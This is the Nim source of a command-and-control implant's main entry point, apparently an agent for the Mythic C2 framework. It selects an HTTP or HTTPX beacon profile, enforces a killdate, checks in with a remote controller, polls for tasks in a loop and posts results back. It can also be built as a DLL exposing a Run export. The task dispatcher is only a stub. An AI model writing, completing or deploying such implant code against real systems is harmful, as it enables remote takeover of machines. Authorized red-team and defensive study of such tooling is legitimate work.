## base.nim
## Main agent entry point - supports multiple C2 profiles via compile-time selection

import asyncdispatch, json, os, strutils, times
import ../utils/config

# Import appropriate C2 profile based on compile-time flag
when defined(HTTPX_PROFILE):
  import ../utils/httpx_profile
  
  proc main() {.async.} =
    echo "[*] Starting Nimble agent with HTTPX profile"
    
    # Check killdate if configured
    when defined(HTTPX_PROFILE) and KILLDATE.len > 0:
      try:
        let killDate = parse(KILLDATE, "yyyy-MM-dd")
        if now() > killDate:
          echo "[!] Killdate reached, exiting"
          quit(0)
      except:
        discard
    
    # Initialize httpx profile
    var profile = newHttpxProfile(PAYLOAD_UUID)
    
    # Perform initial checkin
    echo "[*] Performing initial checkin..."
    let checkinResult = await profile.checkin()
    
    if checkinResult.hasKey("status") and checkinResult["status"].getStr() == "success":
      echo "[+] Checkin successful"
      
      # Main tasking loop
      while true:
        try:
          # Get tasking from Mythic
          let tasks = await profile.getTasking()
          
          if tasks.len > 0:
            echo "[*] Received ", tasks.len, " task(s)"
            
            for task in tasks:
              if task.hasKey("id") and task.hasKey("command"):
                let taskId = task["id"].getStr()
                let command = task["command"].getStr()
                let params = if task.hasKey("parameters"): task["parameters"] else: newJObject()
                
                echo "[*] Executing task: ", taskId, " (", command, ")"
                
                # Execute task (simplified - actual implementation would dispatch to commands)
                var response = %* {
                  "completed": true,
                  "user_output": "Task executed: " & command,
                  "status": "success"
                }
                
                # TODO: Implement actual command dispatcher
                # response = await executeCommand(command, params)
                
                # Post response back to Mythic
                let success = await profile.postResponse(taskId, response)
                if success:
                  echo "[+] Response posted for task: ", taskId
                else:
                  echo "[-] Failed to post response for task: ", taskId
        except Exception as e:
          echo "[-] Error in tasking loop: ", e.msg
          # Continue loop on error
          await sleepAsync(5000)
    else:
      echo "[-] Checkin failed"
      quit(1)
    
    # Cleanup
    profile.close()

elif defined(HTTP_PROFILE):
  # Standard HTTP profile (can be implemented similarly)
  import ../utils/http_profile
  
  proc main() {.async.} =
    echo "[*] Starting Nimble agent with HTTP profile"
    # Implementation for standard HTTP
    discard

else:
  {.error: "No C2 profile defined. Use -d:HTTPX_PROFILE or -d:HTTP_PROFILE".}

# Entry point
when isMainModule:
  # For DLL builds, export Run function
  when defined(windows) and (defined(dll) or defined(lib)):
    proc Run() {.exportc, dynlib.} =
      waitFor main()
  else:
    # Standard executable
    waitFor main()
